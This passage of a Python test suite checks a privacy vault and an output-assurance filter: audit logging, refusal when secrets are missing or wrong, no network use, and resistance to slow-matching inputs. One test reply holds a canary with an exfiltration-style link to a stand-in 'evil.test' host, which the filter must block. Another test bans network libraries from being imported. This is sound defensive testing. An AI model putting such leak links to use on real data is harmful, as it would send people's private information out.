    post(api, {"response": REPLY, "session_id": info.session_id})
    post(api, {"response": f"leak {CANARY} for [PERSON_01]", "session_id": info.session_id})
    post(api, {"response": REPLY}, who="sana.sa")
    with session_scope() as s:
        events = [event_to_dict(e) for e in s.execute(select(AuditEvent).where(
            AuditEvent.event_type == "assurance.check", AuditEvent.seq > baseline).order_by(AuditEvent.seq)).scalars()]
    assert [e["decision"] for e in events] == ["ALLOW", "DENY", "ALLOW"]
    assert "REHYDRATED" in events[0]["reason_codes"] and events[0]["resource_ids"] == [info.session_id]
    assert {"OUTPUT_BLOCKED", "LEAK_DETECTED"} <= set(events[1]["reason_codes"])
    assert events[2]["actor_role"] == SA and "NO_SESSION_CONTEXT" in events[2]["reason_codes"]
    assert events[0]["policy_id"] == "POL-OUTPUT-ASSURANCE-v1" and events[0]["details"]["restored"] == 3
    blob = json.dumps(events)
    assert_no_originals(blob)
    assert_no_canary(blob)
    with session_scope() as s:
        assert verify_chain(s)["valid"] is True  # the HMAC chain is intact after these events
        gated_after = dict(s.execute(select(AuditEvent.decision, func.count(AuditEvent.seq))
                                     .where(AuditEvent.mode == "gated").group_by(AuditEvent.decision)).all())
    assert {e["mode"] for e in events} == {"system"} and gated_after == gated_before  # AMAN 1.0 KPIs are not moved


def test_if_the_audit_trail_cannot_be_written_nothing_is_released(api, monkeypatch):
    info = vault(make_artifact())

    def broken(**_kwargs):
        raise RuntimeError("audit store unavailable")

    monkeypatch.setattr(routes_mod, "append_event", broken)
    r = post(api, {"response": REPLY, "session_id": info.session_id})
    assert r.status_code == 503 and r.json()["detail"]["code"] == "AUDIT_UNAVAILABLE"
    assert_no_originals(r.text)


def test_an_unconfigured_vault_restores_nothing_and_says_why(api, monkeypatch):
    info = vault(make_artifact())
    monkeypatch.setenv("AMAN_ENV", "production")
    monkeypatch.delenv(VAULT_SECRET_ENV, raising=False)  # production with only the demo default: refused
    r = post(api, {"response": REPLY, "session_id": info.session_id})
    assert r.status_code == 200 and r.json()["rehydrated"] is None
    assert r.json()["rehydration"]["reasons"] == {"VAULT_NOT_CONFIGURED": 3}
    assert_no_originals(r.text)


def test_a_wrong_master_secret_at_check_time_restores_nothing_and_is_audited(api, monkeypatch):
    info = vault(make_artifact())
    monkeypatch.setenv(VAULT_SECRET_ENV, ALT_SECRET)
    r = post(api, {"response": REPLY, "session_id": info.session_id})
    b = r.json()
    assert b["rehydrated"] is None and b["rehydration"]["reasons"] == {"VAULT_INTEGRITY_FAILURE": 3}
    assert_no_originals(r.text)
    with session_scope() as s:
        last = s.execute(select(AuditEvent).where(AuditEvent.event_type == "assurance.check")
                         .order_by(AuditEvent.seq.desc())).scalars().first()
        assert "VAULT_INTEGRITY_FAILURE" in last.reason_codes
    monkeypatch.delenv(VAULT_SECRET_ENV)
    assert post(api, {"response": REPLY, "session_id": info.session_id}).json()["rehydrated"] == EXPECTED


def test_a_full_check_flow_opens_no_socket(api, monkeypatch):
    calls = []
    real_connect = socket.socket.connect

    def guarded(self, address):
        calls.append(address)
        raise AssertionError(f"network connection attempted: {address}")

    monkeypatch.setattr(socket.socket, "connect", guarded)
    info = vault(make_artifact(), artifact_id="PD-offline")
    assert post(api, {"response": REPLY, "artifact_id": "PD-offline"}).json()["rehydrated"] == EXPECTED
    assert post(api, {"response": f"{CANARY} https://evil.test/[PERSON_01]", "session_id": info.session_id}).json()["blocked"]
    assert calls == []
    assert socket.socket.connect is guarded and real_connect is not guarded


def test_vault_and_assurance_modules_import_no_network_libraries():
    forbidden = {"socket", "ssl", "http", "urllib", "urllib3", "requests", "httpx", "aiohttp", "ftplib", "smtplib",
                 "telnetlib", "xmlrpc", "websockets", "asyncio"}
    root = Path(check_mod.__file__).parent.parent
    for rel in ("privacy/vault.py", "privacy/vault_models.py", "assurance/check.py", "assurance/routes.py",
                "assurance/__init__.py"):
        for node in ast.walk(ast.parse((root / rel).read_text(encoding="utf-8"))):
            names = ([a.name for a in node.names] if isinstance(node, ast.Import)
                     else [node.module or ""] if isinstance(node, ast.ImportFrom) and node.level == 0 else [])
            assert not {n.split(".")[0] for n in names} & forbidden, (rel, names)


# ------------------------------------------------------------------ robustness
def test_pathological_replies_are_handled_in_bounded_time():
    """No pattern may be quadratic: each hostile input below would take minutes if one were."""
    cases = ["a." * 50_000, "](" * 50_000, "[" * 100_000, "(" * 100_000, "[PERSON_" * 12_000, "http://" * 14_000,
             "href=" * 20_000, "PERSON_" * 14_000, "​" * 100_000, "1,234," * 16_000, "[ " * 50_000,
             "[PERSON_01]" * 9_000, "kill " * 20_000, "data:" * 20_000, "www." * 25_000, "x@" * 50_000, "<" * 100_000,
             "9" * 100_000, "[REDACTED:" * 10_000, "(ORG_1" * 16_000]
    started = time.perf_counter()
    slowest = 0.0
    for text in cases:
        t0 = time.perf_counter()
        res = check_response(text[:MAX_REPLY_CHARS], ctx=None, role=PO, purpose=DEFAULT_PURPOSE)
        slowest = max(slowest, time.perf_counter() - t0)
        assert res.rehydrated is None
    # with a real vault session the restoration path runs too: thousands of tokens, thousands of links
    info = vault(make_artifact())
    for text, restored in (("[PERSON_01] " * 8_000, 8_000), ("[PERSON_01] https://a.test/x " * 3_000, 3_000),
                           ("[PERSON_01]https://a.test/[ORG_01] " * 2_500, 2_500)):
        t0 = time.perf_counter()
        res = run(text[:MAX_REPLY_CHARS], info)
        slowest = max(slowest, time.perf_counter() - t0)
        assert res.rehydration["restored"] == restored and res.rehydration["aborted"] is False
    assert slowest < 8 and time.perf_counter() - started < 60, (slowest, time.perf_counter() - started)


def test_input_that_is_not_text_is_an_input_error_not_a_crash():
    from app.assurance.check import AssuranceInputError

    for bad in (None, 5, b"bytes", ["x"], "x" * (MAX_REPLY_CHARS + 1), "lone \ud800 surrogate"):
        with pytest.raises(AssuranceInputError):
            check_response(bad, ctx=None, role=PO, purpose=DEFAULT_PURPOSE)  # type: ignore[arg-type]
    with pytest.raises(AssuranceInputError):
        check_response("ok", ctx=None, role=PO, purpose=DEFAULT_PURPOSE, grounding_text=b"x")  # type: ignore[arg-type]


def test_a_real_docx_flows_through_protect_vault_and_check():
    """WP1 -> vault -> assurance on a real document: people named only in a comment never enter the vault."""
    body = para(docx_run("Supplier contact: Ayesha Khan, ayesha.khan@northbridge.example, for Northbridge University."))
    data = make_docx(body, comments=[("Omar Siddiqui", "Ask Bilal Ahmed about the bid.")])
    art = protect_document(data, "quote.docx", task="summarize quotation", role=PO, destination="local_simulator")
    assert art.export_allowed
    assert set(art.rehydration_table.values()) == {"Ayesha Khan", "ayesha.khan@northbridge.example",
                                                   "Northbridge University"}
    info = vault(art, artifact_id="PD-docx")
    tokens = sorted(art.rehydration_table)
    res = run("Summary: " + " / ".join(tokens), info)
    assert res.rehydrated == "Summary: " + " / ".join(art.rehydration_table[t] for t in tokens)
    assert res.placeholder_integrity["ok"] is True and res.placeholder_integrity["dropped"] == []
    # the comment's people were omitted from the artifact, so no placeholder exists for them
    invented = run("See [PERSON_02].", info)
    assert invented.placeholder_integrity["unexpected"] == ["[PERSON_02]"] and invented.rehydrated is None


def test_quote_fixture_is_the_documented_one():
    assert "Ayesha Khan" in QUOTE_TEXT and dict(make_artifact().rehydration_table) == ORIGINALS
